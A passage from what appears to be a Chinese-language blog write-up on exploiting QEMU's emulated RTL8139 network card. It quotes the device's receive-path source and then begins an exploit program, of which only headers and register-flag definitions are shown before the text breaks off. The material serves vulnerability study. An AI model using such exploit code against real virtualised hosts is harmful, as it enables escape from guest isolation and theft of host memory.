size;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        DPRINTF(<span class="string">"in C+ Rx mode ================\n"</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* begin C+ receiver mode */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* w0 ownership flag */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CP_RX_OWN (1&lt;&lt;31)</span></span><br><span class="line"><span class="comment">/* w0 end of ring flag */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CP_RX_EOR (1&lt;&lt;30)</span></span><br><span class="line"><span class="comment">/* w0 bits 0...12 : buffer size */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CP_RX_BUFFER_SIZE_MASK ((1&lt;&lt;13) - 1)</span></span><br><span class="line"><span class="comment">/* w1 tag available flag */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CP_RX_TAVA (1&lt;&lt;16)</span></span><br><span class="line"><span class="comment">/* w1 bits 0...15 : VLAN tag */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CP_RX_VLAN_TAG_MASK ((1&lt;&lt;16) - 1)</span></span><br><span class="line"><span class="comment">/* w2 low  32bit of Rx buffer ptr */</span></span><br><span class="line"><span class="comment">/* w3 high 32bit of Rx buffer ptr */</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">int</span> descriptor = s-&gt;currCPlusRxDesc;</span><br><span class="line">        <span class="keyword">dma_addr_t</span> cplus_rx_ring_desc;</span><br><span class="line"></span><br><span class="line">        cplus_rx_ring_desc = rtl8139_addr64(s-&gt;RxRingAddrLO, s-&gt;RxRingAddrHI);</span><br><span class="line">        cplus_rx_ring_desc += <span class="number">16</span> * descriptor;</span><br><span class="line"></span><br><span class="line">        DPRINTF(<span class="string">"+++ C+ mode reading RX descriptor %d from host memory at "</span></span><br><span class="line">            <span class="string">"%08x %08x = "</span>DMA_ADDR_FMT<span class="string">"\n"</span>, descriptor, s-&gt;RxRingAddrHI,</span><br><span class="line">            s-&gt;RxRingAddrLO, cplus_rx_ring_desc);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">uint32_t</span> val, rxdw0,rxdw1,rxbufLO,rxbufHI;</span><br><span class="line"></span><br><span class="line">        pci_dma_read(d, cplus_rx_ring_desc, &amp;val, <span class="number">4</span>);</span><br><span class="line">        rxdw0 = le32_to_cpu(val);</span><br><span class="line">        pci_dma_read(d, cplus_rx_ring_desc+<span class="number">4</span>, &amp;val, <span class="number">4</span>);</span><br><span class="line">        rxdw1 = le32_to_cpu(val);</span><br><span class="line">        pci_dma_read(d, cplus_rx_ring_desc+<span class="number">8</span>, &amp;val, <span class="number">4</span>);</span><br><span class="line">        rxbufLO = le32_to_cpu(val);</span><br><span class="line">        pci_dma_read(d, cplus_rx_ring_desc+<span class="number">12</span>, &amp;val, <span class="number">4</span>);</span><br><span class="line">        rxbufHI = le32_to_cpu(val);</span><br><span class="line"></span><br><span class="line">        DPRINTF(<span class="string">"+++ C+ mode RX descriptor %d %08x %08x %08x %08x\n"</span>,</span><br><span class="line">            descriptor, rxdw0, rxdw1, rxbufLO, rxbufHI);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!(rxdw0 &amp; CP_RX_OWN))</span><br><span class="line">        &#123;</span><br><span class="line">            DPRINTF(<span class="string">"C+ Rx mode : descriptor %d is owned by host\n"</span>,</span><br><span class="line">                descriptor);</span><br><span class="line"></span><br><span class="line">            s-&gt;IntrStatus |= RxOverflow;</span><br><span class="line">            ++s-&gt;RxMissed;</span><br><span class="line"></span><br><span class="line">            <span class="comment">/* update tally counter */</span></span><br><span class="line">            ++s-&gt;tally_counters.RxERR;</span><br><span class="line">            ++s-&gt;tally_counters.MissPkt;</span><br><span class="line"></span><br><span class="line">            rtl8139_update_irq(s);</span><br><span class="line">            <span class="keyword">return</span> size_;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">uint32_t</span> rx_space = rxdw0 &amp; CP_RX_BUFFER_SIZE_MASK;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* write VLAN info to descriptor variables. */</span></span><br><span class="line">        <span class="keyword">if</span> (s-&gt;CpCmd &amp; CPlusRxVLAN &amp;&amp;</span><br><span class="line">            lduw_be_p(&amp;buf[ETH_ALEN * <span class="number">2</span>]) == ETH_P_VLAN) &#123;</span><br><span class="line">            dot1q_buf = &amp;buf[ETH_ALEN * <span class="number">2</span>];</span><br><span class="line">            size -= VLAN_HLEN;</span><br><span class="line">            <span class="comment">/* if too small buffer, use the tailroom added duing expansion */</span></span><br><span class="line">            <span class="keyword">if</span> (size &lt; MIN_BUF_SIZE) &#123;</span><br><span class="line">                size = MIN_BUF_SIZE;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            rxdw1 &amp;= ~CP_RX_VLAN_TAG_MASK;</span><br><span class="line">            <span class="comment">/* BE + ~le_to_cpu()~ + cpu_to_le() = BE */</span></span><br><span class="line">            rxdw1 |= CP_RX_TAVA | lduw_le_p(&amp;dot1q_buf[ETHER_TYPE_LEN]);</span><br><span class="line"></span><br><span class="line">            DPRINTF(<span class="string">"C+ Rx mode : extracted vlan tag with tci: "</span><span class="string">"%u\n"</span>,</span><br><span class="line">                lduw_be_p(&amp;dot1q_buf[ETHER_TYPE_LEN]));</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">/* reset VLAN tag flag */</span></span><br><span class="line">            rxdw1 &amp;= ~CP_RX_TAVA;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* <span class="doctag">TODO:</span> scatter the packet over available receive ring descriptors space */</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (size+<span class="number">4</span> &gt; rx_space)</span><br><span class="line">        &#123;</span><br><span class="line">            DPRINTF(<span class="string">"C+ Rx mode : descriptor %d size %d received %zu + 4\n"</span>,</span><br><span class="line">                descriptor, rx_space, size);</span><br><span class="line"></span><br><span class="line">            s-&gt;IntrStatus |= RxOverflow;</span><br><span class="line">            ++s-&gt;RxMissed;</span><br><span class="line"></span><br><span class="line">            <span class="comment">/* update tally counter */</span></span><br><span class="line">            ++s-&gt;tally_counters.RxERR;</span><br><span class="line">            ++s-&gt;tally_counters.MissPkt;</span><br><span class="line"></span><br><span class="line">            rtl8139_update_irq(s);</span><br><span class="line">            <span class="keyword">return</span> size_;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">dma_addr_t</span> rx_addr = rtl8139_addr64(rxbufLO, rxbufHI);</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* receive/copy to target memory */</span></span><br><span class="line">        <span class="keyword">if</span> (dot1q_buf) &#123;</span><br><span class="line">            pci_dma_write(d, rx_addr, buf, <span class="number">2</span> * ETH_ALEN);</span><br><span class="line">            pci_dma_write(d, rx_addr + <span class="number">2</span> * ETH_ALEN,</span><br><span class="line">                          buf + <span class="number">2</span> * ETH_ALEN + VLAN_HLEN,</span><br><span class="line">                          size - <span class="number">2</span> * ETH_ALEN);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            pci_dma_write(d, rx_addr, buf, size);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (s-&gt;CpCmd &amp; CPlusRxChkSum)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">/* do some packet checksumming */</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* write checksum */</span></span><br><span class="line">        val = cpu_to_le32(crc32(<span class="number">0</span>, buf, size_));</span><br><span class="line">        pci_dma_write(d, rx_addr+size, (<span class="keyword">uint8_t</span> *)&amp;val, <span class="number">4</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* first segment of received packet flag */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CP_RX_STATUS_FS (1&lt;&lt;29)</span></span><br><span class="line"><span class="comment">/* last segment of received packet flag */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CP_RX_STATUS_LS (1&lt;&lt;28)</span></span><br><span class="line"><span class="comment">/* multicast packet flag */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CP_RX_STATUS_MAR (1&lt;&lt;26)</span></span><br><span class="line"><span class="comment">/* physical-matching packet flag */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CP_RX_STATUS_PAM (1&lt;&lt;25)</span></span><br><span class="line"><span class="comment">/* broadcast packet flag */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CP_RX_STATUS_BAR (1&lt;&lt;24)</span></span><br><span class="line"><span class="comment">/* runt packet flag */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CP_RX_STATUS_RUNT (1&lt;&lt;19)</span></span><br><span class="line"><span class="comment">/* crc error flag */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CP_RX_STATUS_CRC (1&lt;&lt;18)</span></span><br><span class="line"><span class="comment">/* IP checksum error flag */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CP_RX_STATUS_IPF (1&lt;&lt;15)</span></span><br><span class="line"><span class="comment">/* UDP checksum error flag */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CP_RX_STATUS_UDPF (1&lt;&lt;14)</span></span><br><span class="line"><span class="comment">/* TCP checksum error flag */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CP_RX_STATUS_TCPF (1&lt;&lt;13)</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">/* transfer ownership to target */</span></span><br><span class="line">        rxdw0 &amp;= ~CP_RX_OWN;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* set first segment bit */</span></span><br><span class="line">        rxdw0 |= CP_RX_STATUS_FS;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* set last segment bit */</span></span><br><span class="line">        rxdw0 |= CP_RX_STATUS_LS;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* set received packet type flags */</span></span><br><span class="line">        <span class="keyword">if</span> (packet_header &amp; RxBroadcast)</span><br><span class="line">            rxdw0 |= CP_RX_STATUS_BAR;</span><br><span class="line">        <span class="keyword">if</span> (packet_header &amp; RxMulticast)</span><br><span class="line">            rxdw0 |= CP_RX_STATUS_MAR;</span><br><span class="line">        <span class="keyword">if</span> (packet_header &amp; RxPhysical)</span><br><span class="line">            rxdw0 |= CP_RX_STATUS_PAM;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* set received size */</span></span><br><span class="line">        rxdw0 &amp;= ~CP_RX_BUFFER_SIZE_MASK;</span><br><span class="line">        rxdw0 |= (size+<span class="number">4</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* update ring data */</span></span><br><span class="line">        val = cpu_to_le32(rxdw0);</span><br><span class="line">        pci_dma_write(d, cplus_rx_ring_desc, (<span class="keyword">uint8_t</span> *)&amp;val, <span class="number">4</span>);</span><br><span class="line">        val = cpu_to_le32(rxdw1);</span><br><span class="line">        pci_dma_write(d, cplus_rx_ring_desc+<span class="number">4</span>, (<span class="keyword">uint8_t</span> *)&amp;val, <span class="number">4</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* update tally counter */</span></span><br><span class="line">        ++s-&gt;tally_counters.RxOk;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* seek to next Rx descriptor */</span></span><br><span class="line">        <span class="keyword">if</span> (rxdw0 &amp; CP_RX_EOR)</span><br><span class="line">        &#123;</span><br><span class="line">            s-&gt;currCPlusRxDesc = <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            ++s-&gt;currCPlusRxDesc;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        DPRINTF(<span class="string">"done C+ Rx mode ----------------\n"</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        DPRINTF(<span class="string">"in ring Rx mode ================\n"</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* begin ring receiver mode */</span></span><br><span class="line">        <span class="keyword">int</span> avail = MOD2(s-&gt;RxBufferSize + s-&gt;RxBufPtr - s-&gt;RxBufAddr, s-&gt;RxBufferSize);</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* if receiver buffer is empty then avail == 0 */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> RX_ALIGN(x) (((x) + 3) &amp; ~0x3)</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (avail != <span class="number">0</span> &amp;&amp; RX_ALIGN(size + <span class="number">8</span>) &gt;= avail)</span><br><span class="line">        &#123;</span><br><span class="line">            DPRINTF(<span class="string">"rx overflow: rx buffer length %d head 0x%04x "</span></span><br><span class="line">                <span class="string">"read 0x%04x === available 0x%04x need 0x%04zx\n"</span>,</span><br><span class="line">                s-&gt;RxBufferSize, s-&gt;RxBufAddr, s-&gt;RxBufPtr, avail, size + <span class="number">8</span>);</span><br><span class="line"></span><br><span class="line">            s-&gt;IntrStatus |= RxOverflow;</span><br><span class="line">            ++s-&gt;RxMissed;</span><br><span class="line">            rtl8139_update_irq(s);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        packet_header |= RxStatusOK;</span><br><span class="line"></span><br><span class="line">        packet_header |= (((size+<span class="number">4</span>) &lt;&lt; <span class="number">16</span>) &amp; <span class="number">0xffff0000</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* write header */</span></span><br><span class="line">        <span class="keyword">uint32_t</span> val = cpu_to_le32(packet_header);</span><br><span class="line"></span><br><span class="line">        rtl8139_write_buffer(s, (<span class="keyword">uint8_t</span> *)&amp;val, <span class="number">4</span>);</span><br><span class="line"></span><br><span class="line">        rtl8139_write_buffer(s, buf, size);</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* write checksum */</span></span><br><span class="line">        val = cpu_to_le32(crc32(<span class="number">0</span>, buf, size));</span><br><span class="line">        rtl8139_write_buffer(s, (<span class="keyword">uint8_t</span> *)&amp;val, <span class="number">4</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* correct buffer write pointer */</span></span><br><span class="line">        s-&gt;RxBufAddr = MOD2(RX_ALIGN(s-&gt;RxBufAddr), s-&gt;RxBufferSize);</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* now we can signal we have received something */</span></span><br><span class="line"></span><br><span class="line">        DPRINTF(<span class="string">"received: rx buffer length %d head 0x%04x read 0x%04x\n"</span>,</span><br><span class="line">            s-&gt;RxBufferSize, s-&gt;RxBufAddr, s-&gt;RxBufPtr);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    s-&gt;IntrStatus |= RxOK;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (do_interrupt)</span><br><span class="line">    &#123;</span><br><span class="line">        rtl8139_update_irq(s);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> size_;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>最后的exp如下:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/io.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> fd;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> RTL8139 0xc000</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ETH_HLEN 14</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ETH_MTU     1500</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAX 44</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PAGE_SIZE 0x1000</span></span><br><span class="line"><span class="comment">/* w0 ownership flag */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CP_TX_OWN (1&lt;&lt;31)</span></span><br><span class="line"><span class="comment">/* w0 end of ring flag */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CP_TX_EOR (1&lt;&lt;30)</span></span><br><span class="line"><span class="comment">/* first segment of received packet flag */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CP_TX_FS (1&lt;&lt;29)</span></span><br><span class="line"><span class="comment">/* last segment of received packet flag */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CP_TX_LS (1&lt;&lt;28)</span></span><br><span class="line"><span class="comment">/* large send packet flag */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CP_TX_LGSEN (1&lt;&lt;27)</span></span><br><span class="line"><span class="comment">/* large send MSS mask, bits 16...25 */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CP_TC_LGSEN_MSS_MASK ((1 &lt;&lt; 12) - 1)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* IP checksum offload flag */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CP_TX_IPCS (1&lt;&lt;18)</span></span><br><span class="line"><span class="comment">/* UDP checksum offload flag */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CP_TX_UDPCS (1&lt;&lt;17)</span></span><br><span class="line"><span class="comment">/* TCP checksum offload flag */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CP_TX_TCPCS (1&lt;&lt;16)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* w0 bits 0...15 : buffer size */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CP_TX_BUFFER_SIZE (1&lt;&lt;16)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CP_TX_BUFFER_SIZE_MASK (CP_TX_BUFFER_SIZE - 1)</span></span><br><span class="line"><span class="comment">/* w1 add tag flag */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CP_TX_TAGC (1&lt;&lt;17)</span></span><br><span class="line"><span class="comment">/* w1 bits 0...15 : VLAN tag (big endian) */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CP_TX_VLAN_TAG_MASK ((1&lt;&lt;16) - 1)</span></span><br><span class="line"><span class="comment">/* w2 low  32bit of Rx buffer ptr */</span></span><br><span class="line"><span class="comment">/* w3 high 32bit of Rx buffer ptr */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* set after transmission */</span></span><br><span class="line"><span class="comment">/* FIFO underrun flag */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CP_TX_STATUS_UNF (1&lt;&lt;25)</span></span><br><span class="line"><span class="comment">/* transmit error summary flag, valid if set any of three below */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CP_TX_STATUS_TES (1&lt;&lt;23)</span></span><br><span class="line"><span class="comment">/* out-of-window collision flag */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CP_TX_STATUS_OWC (1&lt;&lt;22)</span></span><br><span class="line"><span class="comment">/* link failure flag */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CP_TX_STATUS_LNKF (1&lt;&lt;21)</span></span><br><span class="line"><span class="comment">/* excessive collisions flag */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CP_TX_STATUS_EXC (1&lt;&lt;20)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CP_RX_EOR (1&lt;&lt;30)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CP_RX_OWN (1&lt;&lt;31)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CP_RX_BUFFER_SIZE_MASK ((1&lt;&lt;13) - 1)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> USHRT_MAX 65535</span></span><br><span class="line"><span class="keyword">enum</span> RTL_8139_tx_config_bits &#123;</span><br><span class="line">	TxLoopBack = (<span class="number">1</span> &lt;&lt; <span class="number">18</span>) | (<span class="number">1</span> &lt;&lt; <span class="number">17</span>), <span class="comment">/* enable loopback test mode */</span></span><br><span class="line">	<span class="comment">/*...*/</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">enum</span> RTL_8139_rx_mode_bits &#123;</span><br><span class="line">	AcceptErr       = <span class="number">0x20</span>,</span><br><span class="line">	AcceptRunt      = <span class="number">0x10</span>,</span><br><span class="line">	AcceptBroadcast = <span class="number">0x08</span>,</span><br><span class="line">	AcceptMulticast = <span 